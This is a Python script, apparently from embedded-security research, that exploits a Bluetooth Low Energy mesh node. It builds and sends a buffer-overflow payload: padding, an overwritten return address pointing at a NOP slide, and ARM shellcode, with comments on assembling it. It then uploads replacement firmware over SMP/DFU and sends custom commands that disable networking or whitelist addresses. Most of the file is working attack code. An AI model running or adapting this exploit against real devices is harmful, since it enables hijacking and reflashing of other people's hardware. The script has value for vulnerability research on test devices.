
from smpclient import SMPClient
import asyncio
from smpclient.transport.ble import SMPBLETransport
from smpclient.requests.image_management import ImageStatesRead, ImageStatesWrite
from smpclient.requests.os_management import ResetWrite
from smpclient.requests.shell_management import Execute
from smpclient.generics import SMPRequest
from bleak import BleakScanner
from bleak.backends.device import BLEDevice 
from typing import cast
import time
from bluepy import btle
import cbor2

mesh_device_addr = "EE:A6:76:8F:AC:B9"

# for converting .s to .bin:
# arm-none-eabi-as -mcpu=cortex-m4 -mthumb -o overflow_new.o overflow_new.s
# arm-none-eabi-objcopy -O binary overflow_new.o overflow_new.bin

# bluepy bluetooth connector
class MyDelegate(btle.DefaultDelegate):
    def __init__(self):
        btle.DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data=None):
        print(f"+ Notification from handle {cHandle} with data {data}")
        # resp = b"myIndResp"
        # p.writeCharacteristic(ind_chrc, resp)

def connect_bluepy():
    p = btle.Peripheral(mesh_device_addr, btle.ADDR_TYPE_RANDOM)
    p.setDelegate(MyDelegate)

    mtu_curr = 256
    mtu_size = p.setMTU(mtu_curr)

    print(f"Connected to device: {p.readCharacteristic(11).decode('utf-8')}")
    return p

# deliver the buffer overflow
def deliver_overflow(write_handle, bin_file="overflow_test.s"):
    p = connect_bluepy()
    time.sleep(2)

    prefix = b"X"*32
    offset = 4    # calculate this offset using payload_pattern if possible
    overflow = b"A" * offset
    ret = b'\xf3\x47\x01\x20'   # estimated address of the nop slide (ensure LSB is 1)

    with open(bin_file, "rb") as file:
        payload = file.read()

    # payload_pattern = b"a1b1c1d1e1f1g1h1i1j1k1l1m1n1o1p1q1r1s1t1u1v1w1x1y1z1a2b2c2d2e2f2g2h2i2j2k2l2m2n2o2p2q2r2s2t2u2v2w2x2y2z2a3b3c3d3e3f3g3h3i3j3k3l3m3n3o3p3q3r3s3t3u3v3w3x3y3z3a4b4c4d4e4f4g4h4i4j4k4l4m4n4o4p4q4r4s4t4u4v4w4x4y4z4a5b5c5d5e5f5g5h5i5j5k5l5m5n5o5p5q5r5s5t5u5v5w5x5y5z5"
    # buffer = payload_pattern

    buffer = prefix + overflow + ret + payload
    print(buffer)
    print(f"Buffer length: {len(buffer)}")
    p.writeCharacteristic(write_handle, buffer)

    time.sleep(2)
    p.disconnect()

# discover available services hosted on thenode
def discover_services():
    p = connect_bluepy()
    services = p.getServices()
    write_handle = None
    for service in services:
        print(f"\nService: {service}")
        for chrc in service.getCharacteristics():
            print(f"    - Characteristic: {chrc} (#{chrc.valHandle}) [desc: {chrc.propertiesToString()}]")

            if chrc.uuid == "b0000401-67bd-4eab-aea8-e29e731dd4cd":
                write_handle = chrc.valHandle
            try:
                for desc in chrc.getDescriptors():
                    # processing this takes a second, but that's normal
                    print(f"        - Descriptor: {desc} (#{desc.handle}) [UUID: {desc.uuid}]")
            except btle.BTLEException as e:
                continue
    return write_handle


class SMPCommand:
    def __init__(self, op=0, flags=0, group=64, seq=0, id=0, payload={"":""}):
        self.payload = cbor2.dumps(payload)
        self.header = bytes([
            op,
            flags,
            (len(payload) >> 8) & 0xFF, len(payload) & 0xFF,
            (group >> 8) & 0xFF, group & 0xFF,
            seq,
            id
        ]) 
        
        self.packet = self.header + self.payload

# deliver a custom SMP command to the node
def call_command(smpcommand):
    p = connect_bluepy()
    print(smpcommand.packet)
    ret = p.writeCharacteristic(18, smpcommand.packet)
    print(ret)
    
    time.sleep(2)
    p.disconnect()


# deliver the firmware file over the SMP connection
async def manage_smp(fw_bin_path="zephyr.signed.bin"):
    
    dev = await BleakScanner.find_device_by_address(mesh_device_addr, timeout=10.0)
    if dev is None:
        print("No devices found with the specified address.")
        return
    dev = cast(BLEDevice, dev)

    async with SMPClient(SMPBLETransport(), dev.name or dev.address) as client:
        # await deliver_firmware(client, fw_bin_path)
        print(f"Connected to {client.address}")
        await deliver_firmware(client, fw_bin_path)


# deliver firmware update over DFU to the node
async def deliver_firmware(client, fw_bin_path="zephyr.signed.bin"):
    with open(fw_bin_path, "rb") as file:
        fw = file.read()

    print(f"Connected to {client.address}")
    image_states = await client.request(ImageStatesRead())
    print(f"Image states: {image_states}")

    print("Starting firmware update...")

    # upload firmware to the client in chunks to slot 2
    async for offset in client.upload(fw, 2):
        print(f"\rAt {offset} / {len(fw)} bytes      ", end="", flush=True)

    response = await client.request(ImageStatesRead())
    print(response)
    print("------")
    out = await client.request(ImageStatesWrite(hash=response.images[1].hash, confirm=True))
    print(out)
    print("------")
    out = await client.request(ResetWrite())
    print(out)
    print("------")
    print("Rebooting device...")



whitelist_addr = SMPCommand(op=2, id=0, payload={"msg":"11:22:33:44:55:66"})
rollback = SMPCommand(id=1)
disable_network = SMPCommand(id=2)
enable_network = SMPCommand(id=3)

# example usage:
# write_handle = discover_services()
# deliver_overflow(write_handle=34, bin_file="enable_dfu_no_net.bin")
# asyncio.run(manage_smp("zephyr.signed.bin"))
# call_command(enable_network)
